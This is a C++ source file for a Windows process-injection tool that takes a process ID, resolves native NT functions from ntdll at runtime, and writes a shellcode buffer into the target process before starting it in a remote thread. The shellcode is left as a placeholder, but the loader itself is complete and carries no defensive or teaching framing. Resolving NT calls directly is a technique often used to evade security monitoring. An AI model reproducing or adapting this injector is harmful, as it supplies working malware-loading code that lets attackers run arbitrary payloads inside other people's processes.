#include <windows.h>
#include <TlHelp32.h>
#include <iostream>
#include <winternl.h>


using namespace std;

unsigned char shellcode[] = "PLACEHOLDER";
typedef CLIENT_ID *PCLIENT_ID;

// Declare function pointers for dynamically loaded WinAPI functions
typedef NTSTATUS(NTAPI *pNtOpenProcess)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
typedef NTSTATUS(NTAPI *pNtAllocateVirtualMemory)(HANDLE, PVOID *, ULONG_PTR, PSIZE_T, ULONG, ULONG);
typedef NTSTATUS(NTAPI *pNtWriteVirtualMemory)(HANDLE, PVOID, CONST PVOID, SIZE_T, PSIZE_T);
typedef NTSTATUS(NTAPI *pNtProtectVirtualMemory)(HANDLE, PVOID *, PSIZE_T, ULONG, PULONG);
typedef NTSTATUS(NTAPI *pNtCreateThreadEx)(PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        cout << "Usage: injector.exe <pid>" << endl;
        return 1;
    }

    DWORD pid = atoi(argv[1]);

    // Load required libraries
    HMODULE hNtdll = LoadLibrary(TEXT("ntdll.dll"));
    if (!hNtdll)
    {
        cout << "Failed to load ntdll.dll" << endl;
        return 1;
    }

    // Get function addresses
    pNtOpenProcess NtOpenProcess = (pNtOpenProcess)GetProcAddress(hNtdll, "NtOpenProcess");
    pNtAllocateVirtualMemory NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    // Open process
    HANDLE process;
    OBJECT_ATTRIBUTES objectAttributes;
    InitializeObjectAttributes(&objectAttributes, NULL, 0, NULL, NULL);
    CLIENT_ID clientId;
    clientId.UniqueProcess = (HANDLE)pid;
    clientId.UniqueThread = 0;
    NTSTATUS status = NtOpenProcess(&process, PROCESS_ALL_ACCESS, &objectAttributes, &clientId);
    if (!NT_SUCCESS(status))
    {
        cout << "Could not open process with PID: " << pid << endl;
        return 1;
    }

    int size = sizeof(shellcode);

    // Allocate memory
    LPVOID code = NULL;
    SIZE_T memSize = size;
    status = NtAllocateVirtualMemory(process, &code, 0, &memSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        cout << "Could not allocate memory in target process" << endl;
        return 1;
    }

    // Write shellcode
    SIZE_T bytesWritten;
    status = NtWriteVirtualMemory(process, code, shellcode, size, &bytesWritten);
    if (!NT_SUCCESS(status))
    {
        cout << "Could not write shellcode to targetprocess" << endl;
        return 1;
    }

    // Change memory protection
    DWORD oldProtect;
    SIZE_T protectSize = size;
    status = NtProtectVirtualMemory(process, &code, &protectSize, PAGE_EXECUTE_READ, &oldProtect);
    if (!NT_SUCCESS(status))
    {
        cout << "Could not change memory protection in target process" << endl;
        return 1;
    }

    // Create remote thread
    HANDLE thread;
    status = NtCreateThreadEx(&thread, THREAD_ALL_ACCESS, NULL, process, (LPTHREAD_START_ROUTINE)code, NULL, FALSE, 0, 0, 0, NULL);
    if (!NT_SUCCESS(status))
    {
        cout << "Could not create remote thread in target process" << endl;
        return 1;
    }

    cout << "Shellcode injected successfully" << endl;

    // Cleanup
    FreeLibrary(hNtdll);
    RtlZeroMemory(shellcode, size);

    return 0;
}
